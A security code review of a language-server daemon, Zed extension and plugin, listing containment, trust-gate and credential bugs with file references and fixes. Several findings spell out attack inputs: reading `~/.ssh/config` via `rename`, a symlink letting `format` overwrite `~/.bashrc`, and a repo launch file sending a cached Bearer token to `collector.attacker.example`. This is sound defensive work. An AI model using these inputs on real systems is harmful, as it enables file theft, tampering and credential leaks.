# r2 review B: al-lsp, al-protocol, al-explorer, al-project, al-compile, al-bc, al-publish, al-dap, extension, plugin, scripts, CI, docs

Adversarial re-review of `git diff dev..campaign/2026-09-21` over the half listed above.
Read-only. Every finding checked against code with file:line and a concrete input.

## Coverage

Part 1, fixes that do not fix the finding (sample of 25+):

- [x] r1-lsp: generation guard across awaits (92da8dd9)
- [x] r1-lsp: al.compile holds the guard (92da8dd9)
- [x] r1-lsp: partial frame desync (620956ba)
- [x] r1-lsp: daemon path containment (0949a7ae)
- [x] r1-lsp: block_in_place guard (00667357)
- [x] r1-lsp: sequential dispatch (f4fe24a4)
- [x] r1-lsp: Response::null (00667357)
- [x] r1-lsp: diagnostics retry loop (0255a549)
- [x] r1-lsp: staging loops (0255a549)
- [x] r1-lsp: reindex abort half-publish (8981419e)
- [x] r1-lsp: four insight dispatchers offload (00667357)
- [x] r1-lsp: al_debug inline config (6d765b94)
- [x] r1-lsp: configs[0] launch config selection (4af032d6)
- [x] r1-lsp: did_change reparse (ff9f60a1)
- [x] r1-ext: cached binary never replaced (4c377a73)
- [x] r1-ext: archive integrity check (4c377a73)
- [x] r1-ext: action SHA pinning (af051aa3)
- [x] r1-ext: cross --locked (af051aa3)
- [x] r1-ext: release-dryrun gates (96e4945c)
- [x] r1-ext: debug schema reverse contract (6648ba17)
- [x] r1-ext: RUSTSEC lock update (f1aa7659)
- [x] r1-ext: README tasks claim (fb58b642)
- [x] r1-emit/bc/explorer: sample
- [x] r1-project: sample (analyzers, config, toolchain)
- [x] r1-dap / r1b-dap: sample (al-dap half only)
- [x] r2-security: all eight
- [x] r2-merge-regressions: all

Part 2, security fixes under attack:

- [x] project trust digest coverage (settings value shapes)
- [x] symlinked project root
- [x] trust file writable by the repo
- [x] environment variables a repo can set
- [x] launch config resolving to a trusted host via DNS/redirect
- [x] MCP/daemon method reaching a privileged setting without the gate
- [x] `authorize_cached_credential`
- [x] containment: deepest-existing-ancestor walk, races, Windows forms
- [x] the `text` parameter
- [x] build identity handshake (only if campaign/fix-daemon-lifecycle landed)

Part 3, merge damage:

- [x] daemon dispatch match: every arm once, right dispatcher
- [x] projection and scope layer applies to every list method claimed
- [x] method catalog vs dispatcher vs MCP tool list vs Docs/reference
- [x] which of these the repo tests miss

Part 4, flagged behaviour changes:

- [x] relative `file` resolving against project root
- [x] error -32002
- [x] `--company` required on `snapshot list`
- [x] https required for credentials
- [x] CLI exit codes
- [x] `al-explorer publish` and daemon `publish`
- [x] extension `choose_release` and binary verification
- [x] `binary-checksums.txt` in release.yml
- [x] plugin resolver script

Part 5, quality of the new code:

- [x] tests that assert nothing
- [x] duplicated helpers
- [x] panics reachable from client input
- [x] over-long functions, needless public items
- [x] shell script bugs
- [x] workflow YAML mistakes
- [x] plugin skill text vs current tool behaviour

## Findings

### [SECURITY] `rename` never reaches the containment check, so it reads any file the daemon's user can read

- where: `crates/al-lsp/src/server/daemon/lsp_dispatch.rs:210` (`extract_uri`) and `:219`
  (`ensure_document`). Every other single-file dispatcher goes through
  `read_document_from_params` (lsp_dispatch.rs:61, 86, 114, 144, 161, 190, 239, 254, 267, 298, 353)
  or `file_uri_from_params` (fixes.rs:106, :247, organize.rs:45), which call
  `containment::resolve_within_project`. `dispatch_rename` calls neither.
  `ensure_document` (daemon/mod.rs:1431-1467) does `uri.to_file_path()` and
  `read_source_file` with no root check at all.
- severity: high
- scenario: `al_call` with
  `{"method":"rename","params":{"uri":"file:///home/you/.ssh/config","line":0,"character":0,"newName":"x"}}`.
  `extract_uri` accepts it, `ensure_document` reads the file into
  `workspace.documents`, and the rename query runs over it. Two consequences.
  First an existence and content oracle: the file is refused with "is not a regular file"
  when absent and answered otherwise, and the returned `WorkspaceEdit` carries the ranges of
  every occurrence of the identifier under the cursor. Second, and worse, the document stays
  in the store with no `SuppliedDocument` guard to remove it, and
  `read_document_from_params` (daemon/mod.rs:1698-1704) returns an already-open document
  *before* any containment check. So one `rename` seeds the store, and every later
  `documentSymbols`, `semanticTokens`, `foldingRanges`, `hover` and `codeActions` on that same
  `uri` is then answered from a file outside the project.
- the finding it was meant to close: r1-lsp-protocol "[SECURITY] Daemon and MCP file dispatchers
  accept any absolute path" (status: fixed 0949a7ae), whose fix note says "every daemon method
  that takes a path now rejects anything outside the project root".
  `Docs/reference/daemon-methods.md:143` names `rename` among the methods that "stay confined
  to the project". It is not confined.
- why the tests miss it: every containment test in `daemon/mod.rs:2245-2400` calls
  `file_uri_from_params` directly. Nothing asserts that each dispatcher uses it, and there is no
  `rename` test with an out-of-project `uri`.
- fix: route `dispatch_rename` through `file_uri_from_params` like `format` and `sortMembers`.
  Then add a test that walks the dispatch table and asserts every method taking `uri`/`file`
  refuses an outside path with `-32002`, so the next dispatcher cannot be added without it.
- status: fixed cbd148a4, with the dispatch-table test in 3c88ea2f. `dispatch_rename`
  goes through `read_document_from_params`, and
  `every_path_dispatcher_refuses_a_file_outside_the_project` drives every method the
  table declares as taking a path. `rename` accepts `text` like the other read methods,
  so it joins `al_protocol::methods::TEXT_CAPABLE_METHODS` and the reference.

### [SECURITY] a symlinked `.alpackages` widens the containment boundary to wherever it points

- where: `crates/al-lsp/src/server/daemon/containment.rs:272-288` (`project_boundary` returns
  `project.packages_dir` as a root) and `:102-103`
  (`roots.iter().filter_map(|r| r.canonicalize().ok())`, which resolves the symlink).
  `packages_dir` is set unconditionally at `crates/al-project/src/project.rs:353`
  (`let packages_dir = dir.join(".alpackages");`) with no existence, symlink or containment
  check.
- severity: high
- scenario: a cloned repository ships `.alpackages` as a symlink to `/home/you` (git stores a
  symlink verbatim, so this survives a clone, and nothing in project discovery looks at it).
  Open the project. `project_boundary` returns
  `["<repo>", "<repo>/.alpackages"]`; `resolve_path_within_roots` canonicalises the second to
  `/home/you`, so `/home/you` is now a containment root. Then
  `al_call {"method":"format","params":{"file":"/home/you/.bashrc"}}` passes containment and
  `write_al_file_and_refresh` rewrites that file with formatter output. Every other contained
  write (`fix*`, `sortMembers`, `organizeFiles`, `tests.run`'s `junitOut`, the snapshot
  `outputPath`) reaches the same place.
  The same primitive is available through settings without a symlink on the target side:
  `al.packageCachePath` is gated by trust only when it resolves *outside* the project
  (`crates/al-project/src/trust.rs:461-469`), and `stays_inside_project`
  (`trust.rs:365-389`) normalises the path textually without resolving symlinks, so
  `{"al.packageCachePath": "./cache"}` with `cache -> /home/you` is classed as inside the
  project, applies untrusted, and lands as a containment root.
- fix: canonicalise each boundary root when the project is loaded and refuse (or drop) a root
  that resolves outside the project root unless it came from a trusted setting; and make
  `stays_inside_project` resolve the deepest existing ancestor the way
  `resolve_path_within_roots` does, so a symlink cannot make an outside path look inside.
- status: fixed d51b10bb. `project_boundary` drops a root that resolves outside the
  project root unless the project is trusted, and `stays_inside_project` resolves the
  deepest existing ancestor, so a symlinked `./cache` is privileged.

### [SECURITY] the UNC guard is spelled with backslashes only, so the forward-slash form still reaches `canonicalize`

- where: `crates/al-lsp/src/server/daemon/containment.rs:166-169`
  (`text.starts_with(r"\\") || text.starts_with(r"//?/UNC")`), called at `:72`.
- severity: medium
- scenario: Windows accepts `/` as a path separator everywhere, so
  `//attacker.example/share/x` names the same UNC share as `\\attacker.example\share\x`.
  `is_unc` returns false for it (it starts with `//`, not `\\`, and is not `//?/UNC`), so
  `resolve_path_within_roots` reaches `existing.canonicalize()` at `:111` and Windows opens the
  SMB connection the guard exists to prevent. The refusal that follows is after the fact,
  which is exactly the ordering the fix note calls out.
  The test `rejects_a_unc_path_without_touching_the_filesystem`
  (containment.rs:451-464) checks the three backslash spellings and not this one.
  `is_unc` also returns false for any path `to_str()` cannot decode, which on Windows is a
  path with an unpaired surrogate.
- [UNVERIFIED] on Windows: the review host is Linux, so the SMB lookup itself was not observed.
  The text check is incomplete regardless of what Windows does with it.
- fix: normalise separators before the check, or test both `\\` and `//` prefixes and the
  `?/UNC` / `?\UNC` pair. Add the forward-slash spellings to the existing test.
- status: fixed 5296de64. Both separators are folded together before the check, and a
  path `to_str` cannot decode is refused rather than allowed.

### [SLOP] two `serialized_response` helpers with the same name and swapped arguments

- where: `crates/al-lsp/src/server/daemon/mod.rs:1289` is
  `serialized_response(id, value, method)`; `crates/al-lsp/src/server/daemon/build_dispatch/mod.rs:27`
  is `serialized_response(id, label, value)`. `insight_dispatch.rs:6` imports the first
  (`serialized_response(id, &unused, "deadCode")`, `:158`), `build_dispatch/mod.rs:45` uses the
  second (`serialized_response(id, "obsolescence timeline", &entries)`).
  `lsp_dispatch.rs:18` adds a third spelling of the same function, `ok_response(id, value, method)`.
- severity: low
- scenario: both are generic over `T: Serialize` and `&str` is `Serialize`, so moving a call
  between the two modules compiles and serialises the label as the result. A dispatcher moved
  from `build_dispatch` to `insight_dispatch` would start answering `"obsolescence timeline"`
  instead of the report, and no test would fail.
- fix: keep one helper, in `daemon/mod.rs`, with one argument order.
- status: fixed d7d8caf0. One helper, in `daemon/mod.rs`. `ok_response` and the inline
  copy in the inlay-hint dispatcher are gone too.

### [SLOP] the projection module doc gives an example that does not reduce anything

- where: `crates/al-lsp/src/server/daemon/projection.rs:10-11`: "`by-id table 18` was 194,951
  bytes for a field list; `fields=["fields"]` with `limit=20` is a few kilobytes of the same
  answer."
- severity: low
- scenario: `dispatch_by_id` (lsp_dispatch.rs:711-793) returns an array of *objects*, normally
  one for `table 18`. `limit=20` therefore drops nothing, and `fields=["fields"]` keeps exactly
  the key that holds the 194,951 bytes and drops the small ones. The measurement in the comment
  cannot have come from that call.
- fix: state the parameters that do shrink the answer, or drop the example.
- status: fixed aa61a42c. The example now names the parameters that shrink that answer.

### [SECURITY] `tests.snapshot_capture` spends the cached Business Central token without the trust gate

- where: `crates/al-lsp/src/server/daemon/build_dispatch/tests_dispatch.rs:1981-2023`.
  It calls `debug_dispatch::resolve_debug_config` (`:1981`), then
  `al_symbols::oauth::acquire_token` (`:1999`), then passes the token to
  `capture_live_snapshot` (`:2027`), which is `NativeDebugSession::start(config, &access_token)`
  at `crates/al-test/src/backends/snapshot.rs:110` — the same call `debug start` makes.
  `debug start` gates it at `debug_dispatch.rs:355` with `authorize_debug_target`.
  `tests_dispatch.rs` contains no call to `authorize_cached_credential`,
  `authorize_debug_target` or `authorize_launch_target`: grep finds the four call sites in
  `debug_dispatch.rs:252`, `:280`, `workspace.rs:946` and `al-publish/src/lib.rs:352`, and none
  in the tests dispatcher.
- severity: high
- scenario: a cloned repository ships
  `.vscode/launch.json` = `{"configurations":[{"name":"Local","type":"al","request":"launch","environmentType":"OnPrem","server":"http://collector.attacker.example","serverInstance":"BC","authentication":"AAD","tenant":"<victim tenant>"}]}`.
  The project is never trusted. `al_call` with
  `{"method":"tests.snapshot_capture","params":{"codeunit":50100,"method":"TestX","bcVersion":"25.0"}}`
  resolves that configuration, `debug_uses_oauth` is true, the daemon acquires or refreshes the
  user's token from the keyring-backed cache and `NativeDebugSession::start` sends it as a
  `Bearer` header to the attacker's host. `debug start` with the same launch file refuses,
  naming the project and `al-explorer trust`. Both the trust requirement and the `http://`
  cleartext refusal in `authorize_cached_credential` (trust.rs:647-656) are skipped.
  `debug.accept_invalid_certs` from the same launch file is applied too, without the
  `may_accept_invalid_certs` check that `debug start` performs at `debug_dispatch.rs:358`.
- the claim it breaks: `Docs/features/project-trust.md` "Credentials": "Every path that spends a
  cached Business Central token goes through one authorisation function: debug start, publish, a
  test run against live BC, snapshot capture, and symbol download from a BC server." Two of the
  five named paths live in `tests_dispatch.rs` and neither calls it.
- fix: call `debug_dispatch::authorize_debug_target(workspace, &debug, TargetSource::Repository)`
  in `dispatch_tests_snapshot_capture` before `acquire_token`, and refuse
  `accept_invalid_certs` when the authorization does not allow it. Add a test that lists every
  `acquire_token` / `NativeDebugSession::start` call site and asserts an authorisation call
  precedes it.
- status: fixed 7e70106e, with the dispatch-table declaration in 3c88ea2f.
  `acquire_bc_token` holds the authorisation and the acquisition together, and both
  `debug start` and `tests.snapshot_capture` call it. `acceptInvalidCerts` is refused
  unless the authorisation allows it.

### [SECURITY] the worktree-binary check compares strings, so `..` inside an absolute path walks past it

- where: `src/settings.rs:201-216` (`is_worktree_resident_program`), used at `src/lib.rs:530`
  (`binary.path`) and `:533` (`dotnetPath`). `find_or_download_binary` returns a
  `user_configured_path` at `src/lib.rs:362-364`, before the download and before
  `verify_extracted_binaries`.
- severity: high
- scenario: the check calls a path resident when it is relative, or when
  `path.strip_prefix(root)` succeeds and the remainder starts with a separator. Nothing
  normalises `.` or `..` first. A repository at `/home/you/src/SomeApp` ships
  `.zed/settings.json` =
  `{"lsp":{"al-lsp":{"binary":{"path":"/home/you/src/../src/SomeApp/tools/al-lsp"},"settings":{"dotnetPath":"/home/you/src/../src/SomeApp/tools/dotnet"}}}}`.
  `"/home/you/src/../src/SomeApp/tools/al-lsp".strip_prefix("/home/you/src/SomeApp")` returns
  `None` (the strings diverge at `.` versus `S`), so `is_worktree_resident_program` is false,
  the path is accepted, and `find_or_download_binary` returns the repository's own executable
  with no checksum check. Opening the project in Zed is the whole attack.
  The same shape reaches `dotnetPath`, although `al_project::trust::enforce_dotnet_path`
  (`crates/al-project/src/trust.rs:754-777`) is a second line of defence there because
  `stays_inside_project` does normalise `..`. There is no second line of defence for
  `binary.path`: the binary it names is the server.
  Two more spellings walk past the same check: a path reached through a symlinked ancestor, and
  on a case-insensitive filesystem a path spelled with different case from `worktree_root`.
- the finding it was meant to close: r2-security "[SECURITY] Zed LSP settings choose the
  `dotnet` program and the language server binary" (status: fixed d4445c20).
- why the tests miss it: `src/settings_test.rs:231-258` covers `./tools/al-lsp`,
  `tools/dotnet`, the plain absolute form, `/usr/bin/dotnet`, the `SomeApp-tools` sibling and
  whitespace. No case has `..`, `.`, a symlink or mixed case.
- fix: normalise the path textually before comparing (fold `.`, resolve `..`, collapse repeated
  separators, and compare case-insensitively on Windows and macOS), and reject any path that
  still contains `..` rather than trying to interpret it.
- status: fixed 216e47f9. Both paths are folded into component lists and compared
  component by component, case-insensitively for a Windows spelling; a path whose `..`
  climbs above the root is refused. A symlinked ancestor is still invisible to a WASM
  module with no filesystem API, which `Docs/current-limitations.md` now says.

### [BUG] `al-bin.sh` loops forever when `CLAUDE_PLUGIN_ROOT` is a relative path

- where: `plugin/scripts/al-bin.sh:57-72` (the upward `target/` search).
- severity: low
- scenario: `search="${CLAUDE_PLUGIN_ROOT-}"` is used as given; only the *fallback* branch makes
  the path absolute (`cd -- "$(dirname -- "$0")/.." && pwd`). With a relative
  `CLAUDE_PLUGIN_ROOT` such as `plugins/al-bc`, the loop reaches `search="."`, and
  `dirname -- "."` is `.`, so `[ -n "$search" ] && [ "$search" != "/" ]` stays true forever.
  `.mcp.json` runs this script, so the MCP server never starts and never reports why.
- fix: make `search` absolute before the loop, the same way the fallback branch does, or stop
  when `dirname` returns the value it was given.
- status: fixed 67d7bd08. `search` is absolute before the loop, and
  `make plugin-validate` runs the script from a directory with no `target/` above it
  and fails if it does not terminate.

### [TEST] a consistency test asserts on the word "signature" appearing in the source

- where: `src/repo_consistency_test.rs:782-785`:
  `assert!(!lib.contains("signature"), "the extension verifies no signature, so its source must not claim one")`.
- severity: low
- scenario: the assertion is over the whole of `src/lib.rs` as text, so it fails on any comment
  that mentions the word, including one added to explain that no signature is checked. It
  constrains prose rather than behaviour, and the behaviour it means to pin (no signature
  verification) is not what it tests.
- fix: drop it, or test the thing itself, for example that `verify_extracted_binaries` is the
  only verification call in the download path.
- status: fixed 33bb4881. Dropped. What the extension verifies is pinned by
  `binaries_are_verified_before_they_are_made_executable`.

### [BUG] `binary-checksums.txt` is the file the extension trusts and the one the attestation leaves out

- where: `.github/workflows/release.yml:296-303` (`checksums.txt` covers `*.tar.gz`, `*.zip`,
  `extension.wasm`, `extension.toml`), `:343` (`subject-checksums: artifacts/checksums.txt`),
  `:322-324` (`binary-checksums.txt` is built separately), `src/lib.rs:304-349`
  (the extension verifies against `binary-checksums.txt` and nothing else).
- severity: low
- scenario: `gh attestation verify` covers the archives. The extension never hashes an archive,
  because `zed::download_file` extracts and discards it, so it checks the extracted binaries
  against `binary-checksums.txt` — a file that is neither attested nor listed in
  `checksums.txt`. Anyone who can add an asset to the release can replace both the archive and
  that digest list, and the attestation on the archives does not help because nothing in the
  extension reads it.
- fix: include `binary-checksums.txt` in `checksums.txt` (and so in the attestation subjects),
  so a manual verifier can at least check it. Say in the docs that the extension's automatic
  path verifies integrity only.
- status: fixed 33bb4881. `sha256sum binary-checksums.txt >> checksums.txt` runs before
  the attestation step, so the file the extension reads is attested with the archives.

### [DOCS] the trust doc states three rules the code does not enforce everywhere

- where: `Docs/features/project-trust.md` "Credentials" bullets 2-4, against
  `crates/al-lsp/src/server/daemon/build_dispatch/build/bc_server_params.rs:51-56` and
  `crates/al-lsp/src/server/daemon/build_dispatch/build/snapshot_profiling.rs:43`, `:200`.
- severity: medium
- scenario: the doc says "`acceptInvalidCerts` is honoured only where the project's own
  configuration sets it for the same target, and only when the project is trusted." The
  `snapshot` and `profiling` daemon methods read `acceptInvalidCerts` straight out of the
  request parameters and pass it into `danger_accept_invalid_certs`
  (`crates/al-bc/src/http_auth.rs:91-95`) with no configuration and no trust involved:
  `al_call {"method":"snapshot","params":{"cmd":"list","serverUrl":"https://erp.example.com/BC","company":"X","username":"u","password":"p","acceptInvalidCerts":true}}`.
  Those are caller-supplied credentials rather than cached ones, which is the honest
  distinction, and the doc does not draw it.
  The same section says "a test run against live BC" goes through the authorisation function;
  `dispatch_tests_run` picks its `BcServerConfig` at `tests_dispatch.rs:750-793` and does not.
- fix: say that the rule covers cached credentials, and name the methods where a caller spends
  its own credentials and chooses its own TLS setting.
- status: fixed 490e2eb2. The Credentials section now names the five methods that reach
  a credential the daemon holds, and a section beside it names the methods where the
  caller brings its own credential and chooses its own TLS setting: `snapshot`,
  `profiling`, the `tests.run*` family and `debug start` with an explicit token.

### [DOCS] `--scope` help omits `table-impact`

- where: `crates/al-explorer/src/cli/args.rs:74-76`: "Applies to impact, entrypoints and
  event-map", against `crates/al-lsp/src/server/daemon/scope.rs:46-54`, which also lists
  `tableImpact`, and `Docs/reference/daemon-methods.md:91`, which lists four.
- severity: low
- fix: add `table-impact` to the help text.
- status: fixed aa61a42c.

### [REGRESSION] publish is gated as if it spent a cached credential, and it never does

- where: `crates/al-publish/src/lib.rs:350-360` calls `authorize_cached_credential` with
  `CredentialKind::Bearer`/`Basic` and `TargetSource::Repository`. Every credential publish
  actually uses comes from the environment: `crates/al-bc/src/bc_client.rs:412-413`
  (`BC_USERNAME`/`BC_PASSWORD`) and `:446` (`access_token_from_env`, which reads
  `BC_ACCESS_TOKEN`/`BC_TOKEN` at `crates/al-bc/src/http_auth.rs:44-52`). Nothing in
  `al-publish` touches the keyring cache.
- severity: medium
- scenario: a developer with an on-premises project that has never been trusted runs
  `al-explorer publish` (or the daemon `publish` method) with `BC_USERNAME` and `BC_PASSWORD`
  set. The refusal reads "Refusing to send Business Central basic credentials to
  https://erp.example.com:7049: that server is named by a file this repository carries, and
  this project is not trusted." No cached credential was involved, and the message names one.
  `debug start` draws the distinction the gate needs: `spends_cached_credential =
  supplied_access_token.is_empty() && debug_uses_oauth(&config)`
  (`crates/al-lsp/src/server/daemon/debug_dispatch.rs:347-348`). Publish has no equivalent.
  `Docs/features/project-trust.md` "Settings you wrote yourself" says an environment variable is
  a user-level decision that is not gated, which contradicts what publish does.
- the case for keeping the gate: aiming a developer's `BC_USERNAME`/`BC_PASSWORD` at a server
  the repository chose is still a credential leak, so gating is right. What is wrong is the
  message, and the absence of the `debug start` carve-out for a credential the caller passed
  explicitly.
- fix: say "Business Central credentials" rather than "a cached Business Central token" on this
  path, and reconcile the doc with the rule the code applies.
- status: fixed 490e2eb2. `CredentialKind::Environment` describes that path as
  "Business Central credentials", and the trust doc says why publish is gated although
  it spends an environment credential.

### [DOCS] the settings reference never mentions trust

- where: `Docs/reference/settings.md:21`, `:23`, `:24`, `:46`, `:47`, `:48`, `:49`, `:56`, `:59`
  document `al.codeAnalyzers`, `al.ruleSetPath`, `al.assemblyProbingPaths`,
  `al.packageCachePath`, `al.appLocalFolderPaths`, `al.nugetFeeds`, `al.useOnlyCustomFeeds`,
  `al.compilationOptions` and `al.dotnetPath`. The word "trust" appears zero times in the file.
- severity: medium
- scenario: every one of those keys is now silently dropped when it comes from the repository's
  own settings file and the project is not trusted
  (`crates/al-project/src/trust.rs:313-324`, `:400-501`). The settings reference is where a
  user looks a key up, and it still describes the old behaviour. The README covers it at
  `README.md:499-506` and `Docs/features/project-trust.md` covers it in full, so only the
  reference is out of step.
- fix: add a "needs project trust" column or footnote to the table for those nine keys, linking
  to `Docs/features/project-trust.md`.
- status: fixed 5736d552. Each gated key carries a lock mark and the legend links to
  the trust document; `the_settings_reference_marks_every_gated_key` fails if one
  loses it.

### [BUG] the LSP trust gate fails open when the client sends no root URI

- where: `crates/al-lsp/src/server/lsp.rs:987-991`:
  `let root = root_uri?.to_file_path().ok()?;`, called from `initialize` (`:1068`) and
  `did_change_configuration` (`:1579`).
- severity: low
- scenario: `?` on `None` returns from the function, so with no `rootUri` and no
  `workspaceFolders` (or a non-`file:` root) the merged editor settings, which already contain
  whatever `.zed/settings.json` contributed, are applied whole. The unreadable-settings branch
  at `:1001-1002` calls `deny_privileged`, so the code already knows what to do when it cannot
  decide, and the no-root case does the opposite.
  The containment layer fails closed in the same situation
  (`containment::project_boundary` returns "No project is loaded, so no file path can be
  authorised"), so the two halves disagree.
- [UNVERIFIED] whether Zed ever omits `rootUri`. The asymmetry stands regardless.
- fix: call `deny_privileged(config)` when the root cannot be determined, and say so in the
  advisory.
- status: fixed 97b13970. The no-root case calls `deny_privileged` and says so, with a
  test for a missing root and for a non-`file:` one.

### [SLOP] `plugin/scripts/*.sh` is shellchecked by neither CI nor `make shellcheck`

- where: `.github/workflows/ci.yml:46-50` and the `shellcheck` target in `Makefile` both list
  `scripts/*.sh`, `crates/al-test-harness/editor-e2e/*.sh`,
  `crates/al-test-harness/editor-e2e/container/*.sh` and `tree-sitter-al/tests/*.sh`.
  `plugin/scripts/al-bin.sh`, `al-session-context.sh` and `al-session-end.sh` are in neither.
- severity: low
- scenario: these are the scripts `plugin/.mcp.json` and `plugin/hooks/hooks.json` run on a
  user's machine, so they are the shipped shell surface with the widest reach and the only one
  with no lint. The infinite loop reported above is in one of them.
- fix: add `plugin/scripts/*.sh` to both lists.
- status: fixed 67d7bd08. `plugin/scripts/*.sh` is in the ShellCheck list in `ci.yml`
  and in `make shellcheck`.

### [SLOP] two `#[test]` functions that assert nothing and run nothing

- where: `crates/al-lsp/tests/test_engine_skeleton.rs:9` (`test_types_only_at_canonical_path`)
  and `:17` (`test_status_variants_exist`). The bodies are `std::mem::size_of::<T>()` and
  `let _pass = TestStatus::Pass;`, discarded.
- severity: low
- scenario: both pass by compiling. As `#[test]` functions they report as passing tests and
  measure nothing at runtime, which inflates the count and reads as coverage that is not there.
- fix: make them `const _: () = { ... };` items, or delete them: the types are used by the tests
  in the same file that do assert.
- status: fixed 97b13970. Both are `const` items now.

### [SIMPLIFY] the two functions that carry the credential decision are 629 and 468 lines

- where: `crates/al-lsp/src/server/daemon/debug_dispatch.rs:288-917` (`dispatch_debug`, 629
  lines, a twelve-arm `match cmd` with every arm's body inline) and
  `crates/al-lsp/src/server/daemon/build_dispatch/tests_dispatch.rs:1632-2100`
  (`dispatch_tests_snapshot_capture`, 468 lines). `dispatch_tests_run_batch`
  (`tests_dispatch.rs:452`) is 644 lines.
- severity: low
- scenario: the trust gate for a cached Business Central token lives as twenty lines inside the
  `"start"` arm of `dispatch_debug` (`:346-372`) rather than in the function that acquires the
  token. `dispatch_tests_snapshot_capture` repeats the whole acquire sequence
  (`resolve_debug_config` -> `debug_uses_oauth` -> `access_token_from_env` ->
  `acquire_token`) and omits the gate. That is the shape the SECURITY finding above reports,
  and it is a direct consequence of the duplication.
- fix: one `acquire_bc_token(workspace, &config, supplied, source)` helper that performs the
  authorisation and then the acquisition, so a caller cannot get the token without the check.
  Split the twelve `dispatch_debug` arms into functions while doing it.
- status: fixed 729a0bde, and the helper in 7e70106e. `acquire_bc_token` is the one way
  to a Business Central token, and each `debug` command is its own function.
  `dispatch_tests_snapshot_capture` and `dispatch_tests_run_batch` are shorter by the
  acquisition they no longer repeat but are not split: `tests_dispatch.rs` belongs to
  another agent's queue in this round, so the edit there was kept to the gate.

### [SIMPLIFY] six public items in `al-project::trust` have no caller

- where: `crates/al-project/src/trust.rs:828` (`digest_of`), `:882` (`load_store`), `:858`
  (`TrustStore`), `:852` (`TrustRecord`), `:906` (`state_for`), `:355`
  (`is_builtin_analyzer_token`). A workspace-wide grep outside `trust.rs` finds zero uses of
  each. `trust_project` and `deny_privileged` have one caller each.
- severity: low
- scenario: `al-project` is a publishable library, so each of these is a published API surface
  nothing needs. `digest_of` in particular is the hash function the trust record depends on:
  exposing it invites a caller to compute a digest and write a record without going through
  `grant`, which is the one path that prints the values first.
- fix: make them `pub(crate)`, keeping `TrustStore`/`TrustRecord` public only if the CLI's
  `--show` output is meant to be a stable shape.
- status: fixed 65b7d596. All six are `pub(crate)`.

## Verified fixes

Each checked against the current code, and against a test that would fail without the change.

- **r1-lsp `[SECURITY]` daemon path containment (0949a7ae)** — `file_uri_from_params`
  (`daemon/mod.rs:1568-1602`) routes through `containment::resolve_within_project`. Covered by
  `file_uri_rejects_a_path_outside_the_project`,
  `file_uri_rejects_a_symlink_that_escapes_the_project` and
  `file_uri_rejects_every_path_when_no_project_is_loaded` (`daemon/mod.rs:2245-2305`). One
  dispatcher escaped it: see the `rename` finding above.
- **r1-lsp `[BUG]` empty JSON-RPC results (00667357)** — `lsp_dispatch.rs:227` returns
  `Response::null(id)` for `rename`, and `ok_response_opt` does the same. Covered by
  `ok_response_opt_none_yields_an_explicit_null_result_no_error` (`lsp_dispatch.rs:1599`).
- **r1-lsp `[PERF]` four insight dispatchers inline (00667357)** — `insightStats`,
  `tableImpact`, `traceChain` and `eventMap` all go through `offload`
  (`daemon/mod.rs:908`, `:930`, `:944`, `:951`).
- **r1-lsp `[GAP]` sequential per-connection dispatch (f4fe24a4)** — covered by the pipelined
  test at `daemon/mod.rs:2011` ("a pipelined ping must not wait for the request ahead of it").
- **r1-lsp `[SECURITY]` `al_debug start` inline config (6d765b94, then f344ab52)** — the inline
  and named paths both go through `authorize_debug_target` (`debug_dispatch.rs:355`), and
  `acceptInvalidCerts` is refused unless the authorisation allows it (`:358-366`).
- **r2-security `[SECURITY]` dangling symlink in a contained output path (ae4b7192)** — the tail
  walk at `containment.rs:140-149` refuses any symlink component, and `write_no_follow`
  (`:178-210`) adds `O_NOFOLLOW`. Covered by `rejects_a_dangling_symlink_inside_the_root`,
  `rejects_a_file_below_a_symlinked_parent_directory` and
  `a_symlink_planted_after_the_check_does_not_capture_the_write`.
- **r2-security `[SECURITY]` analyzer and `compilationOptions` from a cloned repo (bbf25313)** —
  `trust::gate` / `trust::evaluate` is applied at every config-load point:
  `al-lsp.rs:414`, `lsp.rs:993` and `:1579`, `daemon/mod.rs:261`, `mcp.rs:1589`,
  `al-explorer/src/cli/commands/build.rs:207`, and `AlConfig::load_for_project`
  (`al-project/src/config.rs:400`). Covered by
  `an_untrusted_project_cannot_add_an_analyzer_dll` and
  `an_untrusted_project_cannot_add_compilation_options`.
- **r2-security `[SECURITY]` project-chosen NuGet feed (388b9a0a)** —
  `nuget::is_acceptable_feed_url` (`nuget.rs:204-240`) allows https or loopback http only, and
  `effective_nuget_feeds` (`workspace.rs:1069-1090`) drops the rest with a log line. Covered by
  `a_feed_url_must_be_https_or_loopback_http` (`nuget.rs:841`).
- **r2-security `[SECURITY]` shared temp socket directory (388b9a0a)** —
  `check_directory_owner` (`daemon/mod.rs:121-160`) walks every existing ancestor and refuses a
  symlink, a directory owned by another user, and a root-owned non-sticky world-writable one.
  Covered by `ensure_private_dir_creates_owner_only` and
  `ensure_private_dir_tightens_preexisting_lax_dir`.
- **r2-security `[SECURITY]` release checksum described honestly (7e473f90)** —
  `actions/attest-build-provenance` is present and SHA-pinned, `Docs/current-limitations.md`
  carries "gh attestation verify" and "It does not show who produced it."
  Covered by `release_provenance_is_published_and_described_honestly`. The gap between the
  attested file and the verified file is a separate finding above.
- **r1-ext `[BUG]` cached binary never replaced (4c377a73)** — `choose_release`
  (`src/lib.rs:164-205`) runs the release lookup first and prunes the other directories only
  when the lookup named the cached version. The offline path still starts from disk.
- **r1-ext `[SECURITY]` archive integrity (4c377a73, extended by 7e473f90)** —
  `verify_extracted_binaries` (`src/lib.rs:304-349`) runs before `make_file_executable`, pinned
  by `binaries_are_verified_before_they_are_made_executable`, and the asset name is pinned to
  `release.yml` by `binary_checksum_asset_is_produced_by_the_release_workflow`.
- **r1-ext `[SECURITY]` action SHA pinning (af051aa3)** — every `uses:` across the three
  workflows is a 40-hex SHA, including `dtolnay/rust-toolchain@6bed0761…`, and
  `check_actions_sha_pinned` (`scripts/check-release-hygiene.sh:262-275`) enforces it.
- **r1-ext `[GAP]` `cargo install cross --locked` (af051aa3)** — `release.yml:106`.
- **r1-ext `[GAP]` `make release-dryrun` gates (96e4945c)** — the target now runs ShellCheck
  (6/16), `cargo deny` (11/16) and the semantic-feature clippy and tests (14/16), and
  `Docs/testing-guide.md:304-321` is renumbered to match.
- **r1-ext `[SECURITY]` RUSTSEC advisories (f1aa7659)** — `Cargo.lock` holds `h2 0.4.19` and
  `rustls 0.23.45`, both above the patched versions, with `deny.toml`'s `ignore` list still
  empty.
- **r2-merge `--no-fail-fast` (CI)** — `.github/workflows/ci.yml:80`, `:253`, `:260`, `:264`.
